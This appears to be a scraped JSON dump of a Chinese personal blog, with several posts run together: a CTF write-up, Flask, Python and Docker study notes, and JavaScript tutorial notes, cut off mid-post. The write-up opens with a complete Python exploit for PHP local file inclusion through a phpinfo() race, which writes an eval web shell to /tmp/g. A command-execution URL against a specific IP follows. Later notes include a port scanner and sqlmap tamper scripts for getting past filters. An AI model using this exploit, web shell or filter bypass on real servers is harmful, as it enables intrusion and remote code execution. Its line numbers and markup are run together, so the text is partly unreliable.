123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190#!/usr/bin/python import sysimport threadingimport socketdef setup(host, port): TAG=\"Security Test\" PAYLOAD=\"\"\"%s\\r&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\\r\"\"\" % TAG REQ1_DATA=\"\"\"-----------------------------7dbff1ded0714\\rContent-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\\rContent-Type: text/plain\\r\\r%s-----------------------------7dbff1ded0714--\\r\"\"\" % PAYLOAD padding=\"A\" * 5000 REQ1=\"\"\"POST /phpinfo.php?a=\"\"\"+padding+\"\"\" HTTP/1.1\\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=\"\"\"+padding+\"\"\"\\rHTTP_ACCEPT: \"\"\" + padding + \"\"\"\\rHTTP_USER_AGENT: \"\"\"+padding+\"\"\"\\rHTTP_ACCEPT_LANGUAGE: \"\"\"+padding+\"\"\"\\rHTTP_PRAGMA: \"\"\"+padding+\"\"\"\\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\rContent-Length: %s\\rHost: %s\\r\\r%s\"\"\" %(len(REQ1_DATA),host,REQ1_DATA) #modify this to suit the LFI script LFIREQ=\"\"\"GET /index.php?file=%s HTTP/1.1\\rUser-Agent: Mozilla/4.0\\rProxy-Connection: Keep-Alive\\rHost: %s\\r\\r\\r\"\"\" return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s2.connect((host, port)) s.send(phpinforeq) d = \"\" while len(d) &lt; offset: d += s.recv(offset) try: i = d.index(\"[tmp_name] =&amp;gt; \") fn = d[i+17:i+31] except ValueError: return None s2.send(lfireq % (fn, host)) d = s2.recv(4096) s.close() s2.close() if d.find(tag) != -1: return fncounter=0class ThreadWorker(threading.Thread): def __init__(self, e, l, m, *args): threading.Thread.__init__(self) self.event = e self.lock = l self.maxattempts = m self.args = args def run(self): global counter while not self.event.is_set(): with self.lock: if counter &gt;= self.maxattempts: return counter+=1 try: x = phpInfoLFI(*self.args) if self.event.is_set(): break if x: print \"\\nGot it! Shell created in /tmp/g\" self.event.set() except socket.error: return def getOffset(host, port, phpinforeq): \"\"\"Gets offset of tmp_name in the php output\"\"\" s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host,port)) s.send(phpinforeq) d = \"\" while True: i = s.recv(4096) d+=i if i == \"\": break # detect the final chunk if i.endswith(\"0\\r\\n\\r\\n\"): break s.close() i = d.find(\"[tmp_name] =&amp;gt; \") if i == -1: raise ValueError(\"No php tmp_name in phpinfo output\") print \"found %s at %i\" % (d[i:i+10],i) # padded up a bit return i+256def main(): print \"LFI With PHPInfo()\" print \"-=\" * 30 if len(sys.argv) &lt; 2: print \"Usage: %s host [port] [threads]\" % sys.argv[0] sys.exit(1) try: host = socket.gethostbyname(sys.argv[1]) except socket.error, e: print \"Error with hostname %s: %s\" % (sys.argv[1], e) sys.exit(1) port=80 try: port = int(sys.argv[2]) except IndexError: pass except ValueError, e: print \"Error with port %d: %s\" % (sys.argv[2], e) sys.exit(1) poolsz=10 try: poolsz = int(sys.argv[3]) except IndexError: pass except ValueError, e: print \"Error with poolsz %d: %s\" % (sys.argv[3], e) sys.exit(1) print \"Getting initial offset...\", reqphp, tag, reqlfi = setup(host, port) offset = getOffset(host, port, reqphp) sys.stdout.flush() maxattempts = 1000 e = threading.Event() l = threading.Lock() print \"Spawning worker pool (%d)...\" % poolsz sys.stdout.flush() tp = [] for i in range(0,poolsz): tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag)) for t in tp: t.start() try: while not e.wait(1): if e.is_set(): break with l: sys.stdout.write( \"\\r% 4d / % 4d\" % (counter, maxattempts)) sys.stdout.flush() if counter &gt;= maxattempts: break print if e.is_set(): print \"Woot! \\m/\" else: print \":(\" except KeyboardInterrupt: print \"\\nTelling threads to shutdown...\" e.set() print \"Shuttin' down...\" for t in tp: t.join()if __name__==\"__main__\": main() payload： 12http:&#x2F;&#x2F;202.119.201.197:13077&#x2F;?file&#x3D;&#x2F;tmp&#x2F;g&amp;1&#x3D;system(%27cat%20&#x2F;tmp&#x2F;7IDUrqGOt8PMATm852&#x2F;flag.txt%27);#CUMTCTF&#123;Orz_to_php1nf0&#125; 最后直接命令执行，但好像找了好久才看见flag re连个签到的分都不给你直接010查看搜cumtctf可以看见flag python题禁止py直接上脚本 1234567891011# flag = input()cipher = [80,70,94,71,80,71,85,104,86,39,64,106,76,67,106,71,123,92,125,76,37,106,103,118,80,35,119,32,110]## if(len(flag==29)):# for i,n in enumerate(flag):# if ord(n) ^ 19 != cipher[i]:## else:for i in cipher: a = i ^ 19 print(chr(a),end='') 兄弟们快来帮帮萄萄脱壳拖入IDA可以看见flag pwntest_ncnc 监听领flag babystack脱入010并输入字符串看是直接可以bash 直接读取就可以拿flag crypto幼儿园的密码题rsa，已知e n c 求m 123456789101112131415# e = 0x10001# n = 0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302f# c = 0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2d# Hint ： google RSimport gmpy2from Crypto.Util.number import *e=0x10001c = 0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2dp = 324350545929838254331191385863847627003q = 328413456989577256301798468872388310877n = 0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302fd = gmpy2.invert(e,(p-1)*(q-1))m = pow(c,d,n)print(long_to_bytes(m)) 可以看见flag 小学生的密码题这个很明显就可以看出规律就是一般都是以8开头 然后我有点懒（说实话是不太会写）就一个一个拼接出flag misc真·签到题zip伪加密然后base64解密拿flag 别做题了听歌吧mp3隐写 这个题可以 cumt是密码 然后是mose编码我真是一个一个拼的，应该拿python脚本写比较好，毕竟pytho学得不太好 应该是这个，拼错了好几回 1CUMTCTF&#123;M0RS38MORSE8M0RS38MORSE8M0RSE8AND8MP3ST39O&#125; 大鲨鱼之你可劲找流量包分析，直接跟tcp流可以看见一个盲注的传输内容 是二分法 然后我就又又又自己拼写 拼错了好几回 1CUMTCTF&#123;cecc1394-6133-43d0-be06-a41c5f231dd4&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/tags/CTF/"},{"name":"题解","slug":"题解","permalink":"https://pz1o.top/tags/%E9%A2%98%E8%A7%A3/"}]},{"title":"python开发","slug":"python开发","date":"2020-08-13T11:20:57.000Z","updated":"2020-11-20T14:19:21.459Z","comments":true,"path":"2020/08/13/python开发/","link":"","permalink":"https://pz1o.top/2020/08/13/python%E5%BC%80%E5%8F%91/","excerpt":"","text":"前言顺便复习一下python，主要是掌握一下python的主流框架（Flask和Django ） FlaskURL和视图123456789101112131415161718192021222324252627# 从flask这个框架中导入Flask这个类from flask import Flask# 初始化一个Flask对象# Flask()# 需要传递一个参数__name__# 1. 方便flask框架去寻找资源# 2. 方便flask插件比如Flask-Sqlalchemy出现错误的时候，好去寻找问题所在的位置app = Flask(__name__)# @app.route是一个装饰器# @开头，并且在函数的上面，说明是装饰器# 这个装饰器的作用，是做一个url与视图函数的映射# 127.0.0.1:5000/ -&gt; 去请求hello_world这个函数，然后将结果返回给浏览器@app.route('/')def hello_world(): return '我是第一个flask程序'# 如果当前这个文件是作为入口程序运行，那么就执行app.run()if __name__ == '__main__': # app.run() # 启动一个应用服务器，来接受用户的请求 # while True: # listen() app.run() 设置debug模式 在app.run()中传入一个关键字参数debug,app.run(debug=True)，就设置当前项目为debug模式。 debug模式的两大功能： 当程序出现问题的时候，可以在页面中看到错误信息和出错的位置。 只要修改了项目中的python文件，程序会自动加载，不需要手动重新启动服务器。 使用配置文件 新建一个config.py文件 在主app文件中导入这个文件，并且配置到app中，示例代码如下： 12import configapp.config.from_object(config) URL传参到视图12345@app.route(&#39;&#x2F;user&#x2F;&lt;id&gt;&#39;)def users(id): return u&#39;您请求的参数是：&#123;&#125;&#39;.format(id)#参数需要放在两个尖括号中。#视图函数中需要放和url中的参数同名的参数。 反转URL 什么叫做反转URL：从视图函数到url的转换叫做反转url 反转url的用处： 在页面重定向的时候，会使用url反转。 在模板中，也会使用url反转。 12from flask import Flask,url_forprint url_for(&#39;users&#39;,id&#x3D;&#39;1&#39;) 页面跳转和重定向 用处：在用户访问一些需要登录的页面的时候，如果用户没有登录，那么可以让重定向到登录页面。 123form flask import redirect,url_forurl = url_for('users') users是视图函数redirect(url) jinja2模板模板渲染和参数1.如何渲染模板： 模板放在templates文件夹下 从flask中导入render_template函数。 在视图函数中，使用render_template函数，渲染模板。注意：只需要填写模板的名字，不需要填写templates这个文件夹的路径。 2.模板传参： 如果只有一个或者少量参数，直接在render_template函数中添加关键字参数就可以了。 如果有多个参数的时候，那么可以先把所有的参数放在字典中，然后在render_template中，使用两个星号，把字典转换成关键参数传递进去，这样的代码更方便管理和使用。 3.在模板中，如果要使用一个变量，语法是： 4.访问模型中的属性或者是字典，可以通过的形式，或者是使用. 123456789101112131415def index(): class Person(object): name = 'pz1o' age = 18 p = Person() #login_url = url_for('users') #return redirect(login_url) context = &#123; 'gender':'nan', 'person': p &#125; return render_template('index.html',**context) &lt;p&gt;&#123;&#123;person.name&#125;&#125;&lt;/p&gt;&lt;p&gt;&#123;&#123;person.age&#125;&#125;&lt;/p&gt; if和forif 12345678910111213&#123;% if xxx %&#125;&#123;% else %&#125;&#123;% endif %&#125;&#123;% if user%&#125; &lt;a href=\"#\"&gt;&#123;&#123; user.name &#125;&#125;&lt;/a&gt; &lt;a href=\"#\"&gt;注销&lt;/a&gt;&#123;% else %&#125; &lt;a href=\"#\"&gt;登录&lt;/a&gt; &lt;a href=\"#\"&gt;注册&lt;/a&gt;&#123;% endif %&#125; return render_template('index.html',user=user) for 字典的遍历，语法和python一样，可以使用items()、keys()、values()、iteritems()、iterkeys()、itervalues() 123&#123;% for k,v in user.items() %&#125; &lt;p&gt;&#123;&#123; k &#125;&#125;：&#123;&#123; v &#125;&#125;&lt;/p&gt;&#123;% endfor %&#125; 列表的遍历：语法和python一样。 123&#123;% for website in websites %&#125; &lt;p&gt;&#123;&#123; website &#125;&#125;&lt;/p&gt;&#123;% endfor %&#125; 过滤器 介绍和语法： 介绍：过滤器可以处理变量，把原始的变量经过处理后再展示出来。作用的对象是变量。 语法： 1&#123;&#123;avatar|default()&#125;&#125; default过滤器：如果当前变量不存在，这时候可以指定默认值。 1234#修改默认图片avatar = 'xxx'return render_template('index.html',avatar=avatar)&lt;img src='&#123;&#123;avatar|default('...')&#125;&#125;'&gt; length过滤器：求列表或者字符串或者字典或者元组的长度。 1234567891011121314151617181920212223#统计评论条数def index():comment = [ &#123; 'user':'pz1o', 'content':'xxx' &#125;, &#123; 'user':'lzy', 'content':'xxxx' &#125; ] return render_template('index.html',comments=comment) &lt;p&gt;评论数:&#123;&#123; comments|length &#125;&#125;&lt;/p&gt; &lt;ul&gt; &#123;% for i in comments %&#125; &lt;li&gt; &lt;a href=\"#\"&gt;&#123;&#123; i.user &#125;&#125;&lt;/a&gt; &lt;/li&gt; &lt;a &gt;&#123;&#123; i.content &#125;&#125;&lt;/a&gt; &#123;% endfor %&#125; &lt;/ul&gt; 继承和block123456#python中的继承class Person(object): name &#x3D; &#39;pz1o&#39; age &#x3D; 18class Student(Person): pass 继承作用和语法： 作用：可以把一些公共的代码放在父模板中，避免每个模板写同样的代码。 语法： 1&#123;% extends &#39;base.html&#39;%&#125; block实现： 作用：可以让子模板实现一些自己的需求。父模板需要提前定义好。 注意点：子模板中的代码，必须放在block块中。 123&#123;% block main %&#125; &lt;h1&gt;这是首页&lt;&#x2F;h1&gt;&#123;% endblock %&#125; python开发基础123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191#!/usr/bin/pythonprint('hello pz1o')#linux下执行chmod 777 python./a.py#优化生成pyopython -O -m py_compile a.pypython a.pyo#evala = '[1,2,3]'b = eval(a)print(b)#%格式化字符串#%c:asciia = 97print('i am %c'%a)#%x:16进制print('i am %x'%a)#%o:8进制print('i am %o'%a)#日期time = time.time()time.sleep(1)#args处理多余参数 args处理列表和元组 kwargs处理字典def sub(num1,num2,*args,**kwargs): print(num1-num2) print(args) print(kwargs)a = [5,3,2]sub(*a)2 (2,) &#123;&#125;sub(5,3,x=2)2 () &#123;'x': 2&#125;#文件操作#r只读 #w写入 删除原文件，重新写入，无则创建#a写入 文件末尾追加新的内容，无则创建#a+读写 文件末尾追加新的内容，无则创建#b 打开二进制文件with open('yyds.txt','r') as f: print(f.read())CUMTCTF&#123;1b8947a6f2b048c284515d8bd209c83f&#125; f.seek(7,0) print(f.read())&#123;1b8947a6f2b048c284515d8bd209c83f&#125;#f.seek('偏移量','选项')#选项为0时，从文件头部向后偏移#选项为1时，从当前位置偏移#选项为2时，从文件末向前偏移 #os模块os.mkdir('./yyds')os.rmdir('./yyds')os.listdir('./')os.getcwd()os.chdir('../') #改变当前工作目录os.system('dir') #返回状态,0为成功,1为失败res = os.popen('dir') #返回一个对象print(res.read())#捕捉异常try: 正常代码except 错误: 如果出现错误，执行这段代码finally: 最终执行这段代码 #网络编程#非常简易的扫描器import sysimport socketport = [21,22,23,80,135,139,443,1433,3306,3389]allports = [0,65535]def scan(ip,port,*args,**kwargs): s = socket.socket() try: s.connect((ip, port)) print(\"[+]The %s port %s is open\"%(ip,port)) return True except: print(\"[+]The %s port %s is closed\"%(ip,port)) return Falsedef ports(ip,port):#search some incoming specific parameters for p in port: scan(ip,p)def convert(array): a = [] for x in array: a.append(int(x)) return adef portsplus(ip,port):#search the parameters of an interval passed in for p in range(port[0],port[1]+1): scan(ip,p)if __name__ == '__main__': try: if len(sys.argv) &lt; 2: print('''[+]You can read the following rules to use this tool.[+]python scanport.py host ports[+]The Default scanports are 21,22,23,80,135,139,443,1433,3306,3389[+]python scanport.py 127.0.0.1 80,90,3306,3389[+]python scanport.py 127.0.0.1 80-90[+]python scanport.py 127.0.0.1 all ''') elif len(sys.argv) == 2: ports(sys.argv[1],port) else: ip = sys.argv[1] if ',' in sys.argv[2]: p = sys.argv[2] p = p.split(',') ports(ip,convert(p)) elif '-' in sys.argv[2]: p = sys.argv[2] p = p.split('-') portsplus(ip,convert(p)) elif sys.argv[2] == 'all': portsplus(ip,allports) else: port = int(sys.argv[2]) scan(ip,port) except: print('''[+]There is something wrong!!! ''') finally: print('''[+]The task has been completed!!! ''') #类和对象class Person: __age = 18 #私有属性 name = 'name' def __init__(self,name): self.name = name; def introduce(self): print(\"my name is %s,and my age is %d\"%((self.name),(self.__age))) def __hello(self):#私有方法 print(\"Hello!! My name is %s\"%(self.name))pz1o = Person('pz1o')pz1o.introduce()#公有方法调用print(pz1o._Person__age)#私有属性调用pz1o._Person__hello()#私有方法调用#tamper编写--tamper scan.py#绕空格def tamper(payload,**kwargs): retVal = payload if payload: retVal = \"\" for x in payload: if x.isspace(): retVal += \"/**/\" else: retVal += x return retValprint(tamper(\"1' and 1=1#\"))#不过滤引号里的内容def tamper(payload,**kwargs): retVal = payload if payload: retVal = \"\" flag = False for x in payload: if x == \"'\" or x == '\"': flag = not flag retVal += \"'\" elif x.isspace() and not flag: retVal += \"/**/\" else: retVal += x return retValprint(tamper(\"1' my name is pz1o' and 1=1#\"))","categories":[{"name":"开发","slug":"开发","permalink":"https://pz1o.top/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"开发","slug":"开发","permalink":"https://pz1o.top/tags/%E5%BC%80%E5%8F%91/"},{"name":"python","slug":"python","permalink":"https://pz1o.top/tags/python/"}]},{"title":"Docker学习","slug":"Docker学习","date":"2020-08-07T01:01:06.000Z","updated":"2020-11-20T14:18:44.308Z","comments":true,"path":"2020/08/07/Docker学习/","link":"","permalink":"https://pz1o.top/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"前言白嫖的阿里云服务器不能浪费了，来学习一下docker,只记录一下重要的。 b站学习资源https://www.bilibili.com/video/BV1og4y1q7M4? Docker基础基本概念 镜像（ Image ） ：Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。 容器（ Container ） ：镜像（ Image ）和容器（ Container ）的关系，就像是面向对象程序设计中的 类 和实例 一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。 仓库（ Repository ）：一个 Docker Registry 中可以包含多个仓库（ Repository ）；每个仓库可以包含多个标签（ Tag ）；每个标签对应一个镜像。 安装12345678910111213141516171819202122232425262728//1.卸载旧版本sudo yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-engine//2.需要安装安装包yum install -y yum-utils//3.设置镜像仓库yum-config-manager \\ --add-repo \\ http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo//4.更新yumyum makecache fast//5.安装dockeryum install docker-ce docker-ce-cli containerd.io一直y//6.启动dockersystemctl start docker//7.测试dockerdocker version docker run hello-world//8.docker镜像docker images 1234&#x2F;&#x2F;卸载dockeryum remove docker-ce docker-ce-cli containerd.iorm -rf &#x2F;var&#x2F;lib&#x2F;docker&#x2F;var&#x2F;lib&#x2F;docker docker 默认工作路径 run的流程 Docker与vm传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程。容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核，而且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便。 常用命令12docker version &#x2F;&#x2F;版本信息docker info &#x2F;&#x2F;系统信息 文档：https://docs.docker.com/ 镜像命令 1234567891011docker images -a //列出所有镜像dokcer images -q //只显示id[root@/]# docker imagesREPOSITORY(镜像的仓库源) TAG(标签) IMAGE ID(镜像的id) CREATED(创建时间) SIZE(大小)hello-world latest bf756fb1ae65 7 months ago 13.3kBdocker search mysql //搜索镜像dokcer pull mysql[:tag] //下载镜像docker pull docker.io/library/mysql:latestdocker rmi -f id //删除镜像docker rmi -f $(docker images -aq) //删除全部镜像 容器命令 ==有镜像才可以创建容器，先安装一个centos== 123456789101112131415161718192021222324docker pull centosdocker run [参数] image //新建容器并启动--name=\"name1\" //容器名字-d //后台运行-P //随机把容器的端口映射到一个主机未使用的高端口-i //以交互模式运行容器，常与-t连用-t //为容器重新分配一个伪输入终端，常与-i连用-it //交互方式运行-p ip：主机端口：容器端口 //指定容器端口docker ps //正在运行的容器docker ps -a //历史运行的容器docker rm 容器id //删除容器docker rm -f $(docker ps -aq) //删除所有容器docker start 容器id //启动容器docker restart 容器id //重启容器docker stop 容器id //停止容器docker kill 容器id //杀死容器//进入容器docker run -it centos /bin/bash//退出容器exit 停止退出ctrl+p+q 不停止退出 从github复现CTF首先从github上clone下来 1git clone xxx 若有docker.yml直接 1234docker-compose builddocker-compose up -ddocker ps #查看端口号 如果有dockerfile 12345进入dockerfile目录设置权限docker build -t &#39;自定义镜像名称&#39; .(最后有一个点)docker run --name&#x3D;&#39;自定义容器名称&#39; -i -d -P 镜像名称 &#x2F;run.shdocker ps &#x2F;&#x2F;查看端口号 查看端口号 部署完成","categories":[{"name":"Docker","slug":"Docker","permalink":"https://pz1o.top/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://pz1o.top/tags/Docker/"}]},{"title":"Javascript学习","slug":"javascript学习","date":"2020-07-09T08:36:24.000Z","updated":"2020-11-20T14:19:03.701Z","comments":true,"path":"2020/07/09/javascript学习/","link":"","permalink":"https://pz1o.top/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"Javascript参考廖雪峰教程https://www.liaoxuefeng.com/wiki/1022910821149312 入门javascript引入javascript内部标签 1234&lt;script&gt; /... ..&lt;/script&gt; 外部引入 1&lt;script src=\"./..\"&gt;&lt;/script&gt; 基本语法123456789// 变量var num = 1;// 条件控制if()&#123;..&#125;else&#123;..&#125;//console.log(num) 数据类型变量 变量名是大小写英文、数字、$和_的组合，且不能用数字开头 1var $1 = \"a\"; 数字 123456123 //整数123.1 //浮点数1.1e1 //科学计数法NaN //not a number'abc' //字符串true //布尔值 比较运算符 123=== 等于（类型不一样，值一样）=== 绝对等于（类型一样，值一样） NaN===NaN是false，它与任何值都不相等，包括自己。 isNaN（NaN）会返回true。 数组 中括号 1var arr = [1,2,3,\"hello\"] 对象 大括号,每个属性用逗号隔开，最后不需要 123456789var person = &#123; name: \"111\", age: 3&#125;person.name&gt;111person.age&gt;3 strict模式在同一个页面的不同的JavaScript文件中，如果都不用var申明，恰好都使用了变量i，将造成变量i互相影响，产生难以调试的错误结果。 使用var申明的变量则不是全局变量，它的范围被限制在该变量被申明的函数体内（函数的概念将稍后讲解），同名变量在不同的函数体内互不冲突。 为了修补JavaScript这一严重设计缺陷，ECMA在后续规范中推出了strict模式，在strict模式下运行的JavaScript代码，强制通过var申明变量，未使用var申明变量就使用的，将导致运行错误。 1234'use strict';abc = \"\"hello world\";//使用strict模式上面代码会报错var abc = \"hello world\"; 字符串12345//转义字符\\n\\t'\\x41'; // 完全等同于 'A''\\u4e2d\\u6587'; // 完全等同于 '中文' 多行字符串由于多行字符串用\\n写起来比较费事，所以最新的ES6标准新增了一种多行字符串的表示方法，用反引号 ``表示 模板字符串要把多个字符串连接起来,可以用+也可以用`${..}表示 123456//+号var name = \"xiao\";console.log(123+name);//$&#123;&#125;var name = \"xiao\";console.log(`123$&#123;name&#125;`) 操作字符串 字符串是不可改变的，无论之后赋值，都不会改变。 123var s = \"a\";console.log(s.length); //长度console.log(s[0]); //输出 数组JavaScript的Array可以包含任意数据类型，并通过索引来访问每个元素。 123var arr = [1,2,3];arr.length;arr.length = 6; //可以通过给length赋值，改变数组的大小 对象JavaScript的对象是一种无序的集合数据类型，它由若干键值对组成。 123456789var xiao=&#123; name: 'xiao', age: 18, 'school': 'No.1'&#125;console.log(xiao.name)console.log(xiao['name']) //两种都可以访问xiao的name值console.log(xiao['school']) 由于JavaScript的对象是动态类型，你可以自由地给一个对象添加或删除属性. 12345678910var xiao=&#123; name: 'xiao',&#125;xiao.age=18;alert(xiao.age);delete xiao.age//可以用hasOwnProperty()方法来判断属性是否是自身拥有的xiao.hasOwnProperty('name') //truexiao.hasOwnProperty('age') //false 条件判断1234567891011121314&#x2F;&#x2F;单个判断if(...)&#123; ...&#125;else&#123; ...&#125;&#x2F;&#x2F;多行条件判断 if()&#123;..&#125;else if()&#123;..&#125;else&#123;&#125; JavaScript把null、undefined、0、NaN和空字符串&#39;&#39;视为false，其他值一概视为true. 循环123for(;;)&#123; ...;&#125; for循环最常用的地方就是遍历数组 123456var arr = [1,2,3];var i;for(i=0;i&lt;3;i++)&#123; console.log(arr[i]);&#125;//1 2 3 for in12345678910111213141516var o = &#123; name: 'bob', age: 18&#125;;for(var key in o)&#123; console.log(key); console.log(o[key]);&#125;//name age//bob 18//同样，数组中也可以用for...invar a = ['A','B','C'];for(var i in a)&#123; console.log(a[i]);&#125;//A B C while 123while(...)&#123; ...;&#125; do…while 123do&#123; ...&#125;while(...) Map和SetJavaScript的默认对象表示方式{}可以视为其他语言中的Map或Dictionary的数据结构，即一组键值对。 但是JavaScript的对象有个小问题，就是键必须是字符串。但实际上Number或者其他数据类型作为键也是非常合理的。 MapMap是一组键值对的结构，具有极快的查找速度。 初始化Map需要一个二维数组，或者直接初始化一个空Map。 12345678910//Map初始化var m = new Map();//增m.set('Bob',100);m.set('Pz1o',99);//删m.delete('Bob');//查m.has('Pz1o'); //truem.get('Pz1o'); //99 注意：一个key只能对应一个value，重复定义后面的值会覆盖掉前面的值。 SetSet和Map类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在Set中，没有重复的key。 12345678910//set初始化var s = new Set([1,2,3]);//重复元素会被自动过滤var s = new Set([1,2,3,3]);//增s.add(4);//删s,delete(3);//查s; iterable遍历Array可以采用下标循环，遍历Map和Set就无法使用下标。为了统一集合类型，ES6标准引入了新的iterable类型，Array、Map和Set都属于**iterable类型。** 具有iterable类型的集合可以通过新的for ... of循环来遍历。 123456789101112131415var a = [1,2,3];var s = new Set([1,2,3]);var m = new Map([['A','a'],['Y','y']]);for(var i of a)&#123; console.log(i);&#125;//1 2 3for(var i of s)&#123; console.log(i);&#125;//1 2 3for(var i of m)&#123; console.log(i);&#125;//[\"A\",\"a\"] [\"Y\",\"y\"] for...in和for...of的不同点： for...in会遍历对象的所有属性名称，一个Array数组实际上也是一个对象，它的每个元素的索引被视为一个属性。 for...of则修复了这些问题，它只遍历循环集合的本身元素。 1234567&#x2F;&#x2F;forEach函数同样可以用来遍历var a &#x3D; [&#39;A&#39;,&#39;B&#39;,&#39;C&#39;];a.forEach(function(value,index,a)&#123; console.log(value+&#39;,&#39;+index);&#125;);&#x2F;&#x2F;A,0 B,1 C,2forEach(值,键,自身) 函数函数定义和调用定义函数 1234567891011121314function abs(...)&#123; ... ...&#125;//function 指明是函数的定义//abs是函数名称//(...)里面是参数//&#123;...&#125;是函数体//另一种定义方法var abs = function(..)&#123; ...&#125;;//在这种方式下，function(x)&#123; ... &#125;是一个匿名函数，它没有函数名。但是，这个匿名函数赋值给了变量abs，所以，通过变量abs就可以调用该函数。 请注意，函数体内部的语句在执行时，一旦执行到return时，函数就执行完毕，并将结果返回。因此，函数内部通过条件判断和循环可以实现非常复杂的逻辑。 如果没有return语句，函数执行完毕后也会返回结果，只是结果为undefined。 调用函数 123abs(10);abs(10,111); &#x2F;&#x2F;返回10abs(); &#x2F;&#x2F;返回NaN 由于JavaScript允许传入任意个参数而不影响调用，因此传入的参数比定义的参数多也没有问题。 arguments 1234//arguments(伪数组)//存储了用户的所有实参//伪数组 有length属性 是按照索引存储的fn(1,2,3) //arguments的数组就是1 2 3 实际上arguments最常用于判断传入参数的个数,以此来判断缺失参数。 rest 由于js中会接受接受多余的参数，所以用一个rest数组来表示多余的参数。rest参数只能写在最后，前面用...标识。 123456function fn(a,b,...rest)&#123;console.log(rest);return a+b;&#125;fn(1,2,3); //[3]fn(1,2) //[] 变量作用域与解构赋值如果一个变量在函数体内部申明，则该变量的作用域为整个函数体，在函数体外不可引用该变量。 如果两个不同的函数各自申明了同一个变量，那么该变量只在各自的函数体内起作用。换句话说，不同函数内部的同名变量互相独立，互不影响。 全局作用域 不在任何函数内定义的变量就具有全局作用域。实际上，JavaScript默认有一个全局对象window，全局作用域的变量实际上被绑定到window的一个属性。 123var a = 'A';console.log(a);console.log(window.a); 同样的，函数也是一个变量，也会绑定到windows对象。任何变量（函数也视为变量），如果没有在当前函数作用域中找到，就会继续往上查找，最后如果在全局作用域中也没有找到，则报ReferenceError错误。 名字空间 全局变量会绑定到window上，不同的JavaScript文件如果使用了相同的全局变量，或者定义了相同名字的顶层函数，都会造成命名冲突，并且很难被发现。减少冲突的一个方法是把自己的所有变量和函数全部绑定到一个全局变量中。 12345var Ma = 0;Ma.name = \"xiaoming\";Ma.fn = function()&#123; ....&#125;; 局部作用域 为了解决块级作用域，ES6引入了新的关键字let，用let替代var可以申明一个块级作用域的变量。 常量 ES6标准引入了新的关键字const来定义常量，const与let都具有块级作用域。 解构赋值 解构赋值就是同时对一组变量进行赋值。 12var [x, y, z] = ['hello', 'JavaScript', 'ES6'];console.log(x); 如果需要从一个对象中取出若干属性，也可以使用解构赋值，便于快速获取对象的指定属性。 12345678910111213var person = &#123; name : 'xiaoming', age : 18, university : &#123; specialities : 'cs' &#125;&#125;;//直接赋值var &#123;name,age&#125; = person;//嵌套对象的赋值var &#123;university : &#123;specialities&#125;&#125; = person;//如果想要的变量和对象的属性名不一样，可以如下操作var &#123;name:mz&#125; = person; 使用场景：解构赋值在很多时候可以大大简化代码。例如，交换两个变量x和y的值，可以这么写，不再需要临时变量。 12var x &#x3D; 1,y &#x3D; 2;[x , y] &#x3D; [y ,x]; 如果一个函数接收一个对象作为参数，那么，可以使用解构直接把对象的属性绑定到变量中。 方法在一个对象中绑定函数，称为这个对象的方法。 在一个方法内部，this是一个特殊变量，它始终指向当前对象，也就是xiaoming这个变量。所以，this.birth可以拿到xiaoming的birth属性。 12345678910111213function getAge() &#123; var y = new Date().getFullYear(); return y - this.birth;&#125;var xiaoming = &#123; name: '小明', birth: 1990, age: getAge&#125;;xiaoming.age(); // 30, 正常结果getAge(); // NaN 如果以对象的方法形式调用，比如xiaoming.age()，该函数的this指向被调用的对象，也就是xiaoming，这是符合我们预期的。 如果单独调用函数，比如getAge()，此时，该函数的this指向全局对象，也就是window。 123456789101112131415‘use strict’;var xiaoming = &#123; name : 'xiaoming', age : 18, math : 90, en : 99, grades : function()&#123; var that = this; //捕捉this指针 function getGrades()&#123; //进行重构 return that.math+that.en; &#125; return getGrades(); &#125;&#125; 高阶函数map由于map()方法定义在JavaScript的Array中，我们调用Array的map()方法，传入我们自己的函数，就得到了一个新的Array作为结果。 123var arr = 